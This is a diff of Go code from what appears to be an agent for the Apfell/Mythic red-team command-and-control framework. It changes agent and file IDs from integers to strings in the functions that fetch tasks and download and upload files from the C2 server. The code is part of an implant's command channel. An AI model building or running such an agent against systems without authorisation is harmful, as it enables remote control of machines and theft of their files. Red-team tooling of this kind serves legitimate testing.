@@ -40,7 +40,7 @@ type C2Patchthrough struct {
 	Interval       int
 	Commands       []string
 	ExchangingKeys bool
-	ApfellID       int
+	ApfellID       string
 	UUID           string
 	AesPSK         string
 	UserAgent      string
@@ -111,11 +111,11 @@ func (c *C2Patchthrough) SetXKeys(xkeys bool) {
 	c.ExchangingKeys = xkeys
 }
 
-func (c C2Patchthrough) ApfID() int {
+func (c C2Patchthrough) ApfID() string {
 	return c.ApfellID
 }
 
-func (c *C2Patchthrough) SetApfellID(newApf int) {
+func (c *C2Patchthrough) SetApfellID(newApf string) {
 	c.ApfellID = newApf
 }
 
@@ -192,7 +192,7 @@ func (c C2Patchthrough) GetTasking() interface{} {
 	task := structs.Task{}
 	err := json.Unmarshal(rawTask, &task)
 	if err != nil {
-		return structs.Task{Command: "none", Params: "", ID: 0}
+		return structs.Task{Command: "none", Params: "", ID: ""}
 	}
 
 	return task
@@ -352,10 +352,10 @@ func (c *C2Patchthrough) Download(task structs.Task, params string) {
 }
 
 //Upload the data
-func (c *C2Patchthrough) Upload(task structs.Task, fileid int) []byte {
+func (c *C2Patchthrough) Upload(task structs.Task, fileid string) []byte {
 
-	strApfellID := fmt.Sprintf("%d", c.ApfID())
-	strFID := fmt.Sprintf("%d", fileid)
+	strApfellID := fmt.Sprintf("%s", c.ApfID())
+	strFID := fmt.Sprintf("%s", fileid)
 	url := strings.Replace(GetFile, "CID_REPLACE", strApfellID, -1)
 	url = strings.Replace(url, "FID_REPLACE", strFID, -1)
 	encfileData := c.htmlGetData(fmt.Sprintf("%s%s", c.URL(), url))
